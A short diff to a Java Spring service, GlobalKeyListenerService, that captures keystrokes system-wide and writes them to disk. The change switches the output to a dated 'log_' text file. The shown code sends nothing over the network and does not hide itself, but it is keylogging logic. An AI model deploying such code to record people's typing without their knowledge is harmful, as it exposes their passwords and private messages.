@@ -19,6 +19,10 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 
 @Service
 public class GlobalKeyListenerService {
@@ -74,7 +78,12 @@ public class GlobalKeyListenerService {
                             storedInput.deleteCharAt(storedInput.length() -1);
                         }
                         storedInput.append(keyChar);
-                        File file = new File("file.txt");
+                        String pattern = "MM-dd-yyyy";
+                        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(pattern);
+                        String fileName = "log_" + simpleDateFormat.format(new Date()) + ".txt";
+                        System.out.println(fileName);
+                        File file = new File(fileName);
+                        Path filePath = Paths.get(fileName);
                         try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                             writer.append(storedInput);
                         } catch (IOException e) {
